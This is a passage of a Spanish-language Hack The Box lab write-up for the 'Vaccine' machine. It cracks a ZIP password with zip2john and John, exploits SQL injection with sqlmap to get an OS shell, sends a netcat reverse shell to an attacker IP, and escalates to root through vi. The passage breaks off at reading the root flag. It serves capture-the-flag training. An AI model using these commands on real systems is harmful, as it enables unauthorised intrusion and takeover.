Si intentamos descomprimir el archivo nos pide contraseña. Podemos usar el binario `zip2john` que extrae del archivo ZIP toda la información criptográfica necesaria para que John the Ripper pueda intentar recuperar la contraseña.

```bash
zip2john backup.zip > hash.txt
```

Crackeamos el hash obtenido.

```bash
john  hash.txt --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## Exploitation

Iniciamos sesión con las credenciales obtenidas y vemos un dashboard de catálogo de autos.

![Vaccine Dashboard](@images/writeups/hackthebox/machines/vaccine/vaccine-dashboard.png)

La web tiene una función de búsqueda vulnerable a SQLi.

Capturamos la request con `Burpsuite` y la guardamos en un archivo para usarlo en `sqlmap`.

```bash
sqlmap -r request.req
```

Obtenemos una shell para ejecutar comandos en el sistema.

```bash
sqlmap -r request.req -p search --os-shell
```

Nos ponemos en escucha en nuestra máquina atacante.

```bash
nc -lnvp 1111
```

En la shell que obtuvimos con sqlmap enviamos una reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.41 1111 >/tmp/f
```

Estabilizamos la shell obtenida.

```bash
script /dev/null -c bash
```


## Privilege Escalation

Enumerando algunos directorios damos con el archivo `dashboard.php` dentro del directorio `/var/www/html` que contiene la contraseña para la base de datos pero es reutilizada para iniciar sesión mediante ssh.

En el sitio [GTFOBins](https://gtfobins.org/gtfobins/vi/) hay algunas formas de escalar privilegios con el binario `vi`. Una de ellas puede ser ejecutando el comando que se nos permite ejecutar como el usuario `postgres`, una vez dentro de `vi` entramos en el modo para ingresar comandos presionando la tecla `esc`, luego ingresamos `:` para entrar en modo línea de comandos e ingresamos `!/bin/sh` para obtener una shell como el usuario `root`.

Una vez con la shell como el usuario `root` verificamos con el comando `id`.

```bash
id
```

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

Entramos al directorio `root` y listamos su contenido

```bash
cd /root
```

```bash
ls
```

```plaintext
pg_hba.conf  root.txt  snap
```

Leemos la flag.

```bash
cat root.txt
```
